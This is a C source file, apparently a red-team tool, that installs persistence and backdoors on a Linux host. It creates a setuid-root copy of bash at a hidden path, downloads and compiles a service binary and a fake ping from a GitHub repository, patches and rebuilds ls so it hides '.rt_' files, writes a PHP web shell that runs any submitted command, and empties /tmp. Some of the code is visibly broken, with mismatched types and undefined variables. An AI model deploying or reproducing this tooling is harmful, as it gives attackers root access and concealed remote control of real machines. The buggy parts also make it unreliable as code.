#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h> // For file perms
#include <fcntl.h>
#include <curl/curl.h>
#include <dirent.h> 

#ifdef FILENAME_MAX
    #define FILENAME_LEN FILENAME_MAX
#else
    #define FILENAME_LEN 255
#endif
#define MAX_BUFFER_SIZE 10240

#define BASH_ID       1
#define PROCESSD_ID   2
#define LS_ID         4
#define PING_ID       8
#define FRONTDOOR_ID 16


// Configure install here:
#define INSTALL BASH_ID | PROCESSD_ID | LS_ID | PING_ID | FRONTDOOR_ID


// Debugging mode
// #define QUIET
#define WORKING_DIR "/tmp"

// Useful Macros (modify these if path changes made elsewhere)
#define SETUID_BASH_PATH "/lib/gcc/rt_bash"
#define HTTP_DOCUMENT_ROOT "/var/www/html"

// Slightly less useful Macros
#define SYSTEM_BASH_PATH "/bin/bash"

// Functions:
int re_setuid_bash(void);
void download_file(const char *hostname, const char *path, const char *output_filename);
int re_processd(void);
int re_broken_ls(void);
int re_fake_ping(void);
int re_http_frontdoor(void);

////////////////////////////////////////
////////// SETUID BASH
////////////////////////////////////////

int re_setuid_bash(void){
    struct stat file_stat;
    char copy_buffer[MAX_BUFFER_SIZE];
    int bash, setuid_bash;
    int bytes_read;
    
    if (bash == NULL) {
        #ifndef QUIET
        fprintf(stderr, "setuid bash not found, installing now...\n");
        #endif
    }
    // For more advanced systems, read install file and execute
    // for now, hardcoded

    setuid_bash = creat(SETUID_BASH_PATH, 06755);
    if (setuid_bash == -1){
        perror("creat");
        return -1;
    }

    bash = fopen(SYSTEM_BASH_PATH, "r");
    if (bash == NULL) {
        fprintf(stderr, "Bash not found\n");
        return -1;
    }


    while ((bytes_read = fread(copy_buffer, 1, sizeof(copy_buffer), bash)) > 0) {
        write(setuid_bash, copy_buffer, bytes_read);
    } if (ferror(file)) {
        fprintf(stderr, "\nAn error occurred while reading the file.\n");
    }

    close(setuid_bash);
    fclose(copy_buffer);
    
    return 0;
}

////////////////////////////////////////
////////// Processd
////////////////////////////////////////
void download_file(const char *hostname, const char *path, const char *output_filename) {
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *server;
    char request[MAX_BUFFER_SIZE];
    char response[MAX_BUFFER_SIZE];
    FILE *output_file;

    // Resolve hostname to IP address
    server = gethostbyname(hostname);
    if (server == NULL) {
        fprintf(stderr, "Error: no such host found\n");
        exit(EXIT_FAILURE);
    }

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Error creating socket");
        exit(EXIT_FAILURE);
    }

    // Set server address structure
    bzero((char *)&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
    server_addr.sin_port = htons(80);  // HTTP port

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Error connecting to server");
        exit(EXIT_FAILURE);
    }

    // Prepare the HTTP GET request
    snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, hostname);

    // Send the HTTP GET request
    if (send(sockfd, request, strlen(request), 0) < 0) {
        perror("Error sending request");
        exit(EXIT_FAILURE);
    }

    // Open output file to save the downloaded content
    output_file = fopen(output_filename, "wb");
    if (output_file == NULL) {
        perror("Error opening output file");
        exit(EXIT_FAILURE);
    }

    // Receive and write the response to the file
    ssize_t bytes_received;
    int header_received = 0;

    while ((bytes_received = recv(sockfd, response, sizeof(response), 0)) > 0) {
        if (!header_received) {
            // Skip HTTP headers (e.g., "HTTP/1.1 200 OK")
            char *body_start = strstr(response, "\r\n\r\n");
            if (body_start != NULL) {
                // Move to the body of the HTTP response
                header_received = 1;
                body_start += 4; // Skip past the "\r\n\r\n"
                bytes_received -= (body_start - response);
                fwrite(body_start, 1, bytes_received, output_file);
            }
        } else {
            // Write the body of the HTTP response to the file
            fwrite(response, 1, bytes_received, output_file);
        }
    }

    if (bytes_received < 0) {
        perror("Error receiving data");
    }

    // Close the file and socket
    fclose(output_file);
    close(sockfd);

    printf("File downloaded successfully!\n");
}
int re_processd(void){
    // TODO: Add error handling

    // Install prereqs
    system("apt install -y libcurl4-openssl-dev");

    // processd.c
    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.c", "/tmp/processd.c");
    // processd executable
    system("gcc /tmp/processd.c -o /var/lib/processd");
    system("chmod 500 /var/lib/processd");
    // remove tmp file
    system("rm /tmp/processd.c");

    // processd.service
    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service", "/etc/systemd/system/processd.service");
    // Install service
    system("systemctl daemon-reload && systemctl start processd && systemctl enable processd");

    return 0;
}

////////////////////////////////////////
////////// Broken ls
////////////////////////////////////////
static const char *ls_commands = { "sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list", 
    "apt update", 
    "apt-get source -y coreutils && apt-get build-dep -y coreutils", 
    "cd coreutils-*", 
    "yes | autoreconf -fiv", 
    "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules", 
        "awk 'BEGIN { \n" 
        "  found = 0; inserted = 0\n" 
        "} \n" 
        "/file_ignored \\(char const \\*name\\)$/ { \n"
        "  print $0\n"
        "  found = 1\n" 
        "  next\n"
        "} \n" 
        "found == 1 && inserted == 0 && $0 == \"{\" { \n" 
        "  print $0\n"
        "  print \"  if (strncmp(name, \\\".rt_\\\", 3) == 0) { return true; }\"\n" 
        "  inserted = 1\n"
        "  found = 2\n"
        "  next\n"
        "} \n"
        "{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c", 
    "make -j`nproc`", 
    "echo \"Replacing ls\"", 
    "cp src/ls `which ls`", 
    "cd ..",
    NULL
};
int re_broken_ls(void){
    char **current_string = ls_commands;
    while (*current_string) {
        system(*current_string++);
    };
    return 0;
}

////////////////////////////////////////
////////// Broken ping
////////////////////////////////////////

int re_fake_ping(void){
    // Download ping.c
    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/ping/ping.c", "/tmp/ping.c");
    // Replace ping
    system("gcc /tmp/ping.c -o `which ping`");
    // Remove temporary file
    system("rm /tmp/ping.c");
    return 0;
}

////////////////////////////////////////
////////// Broken ls
////////////////////////////////////////
const char *frontdoor_contents = "<form method=\"GET\">\n"
"    <p>Command: <input type=\"text\" name=\"command\"></p>\n"
"    <input type=\"submit\" value=\"Run\">\n"
"</form>\n"
"<?php\n"
"    if(isset($_GET[\"command\"])){\n"
"        $out = shell_exec($_GET[\"command\"]);\n"
"        echo \"<pre>\" . $out . \"</pre>\";\n"
"    }\n"
"?>";
int re_http_frontdoor(void){
    // Create file and write above php
    FILE *fp = fopen("" HTTP_DOCUMENT_ROOT "/rt_frontdoor.php", "w+");
    fprintf(fp, "%s", frontdoor_contents);
    fclose(fp);

    return 0;
}

#define FAILURE_STRING "Failed to install %s\n"
#define print_failure(message) fprintf(stderr, FAILURE_STRING, message);

int main(int argc, char **argv){
    struct dirent *de;
    DIR *dr;
    int failures = 0;
    char current_file[FILENAME_MAX];

    // Change working directory 
    chdir(WORKING_DIR);

    // Run install subprograms
    if(INSTALL & BASH_ID && re_setuid_bash())
        failures |= BASH_ID;
    if(INSTALL & PROCESSD_ID && re_processd())
        failures |= PROCESSD_ID;
    if(INSTALL & LS_ID && re_broken_ls())
        failures |= LS_ID;
    if(INSTALL & PING_ID && re_fake_ping())
        failures |= PING_ID;

    // Empty /tmp
    dr = opendir(WORKING_DIR);
    if (dr == NULL) { 
        perror("opendir"); 
        return 1;
    }
    while ((de = readdir(dr)) != NULL) {
        #ifndef QUIET
        fprintf(stderr, "Removing " WORKING_DIR "/%s\n", de->d_name);
        #endif
        sprintf(current_file, "" WORKING_DIR "/%s", de->d_name);
        remove(current_file);
    }
    closedir(dr);

    // Print failures at program end
    if (failures & BASH_ID)
        print_failure("setuid bash");
    if (failures & PROCESSD_ID)
        print_failure("processd");
    if (failures & LS_ID)
        print_failure("ls");
    if (failures & PING_ID)
        print_failure("false ping");
}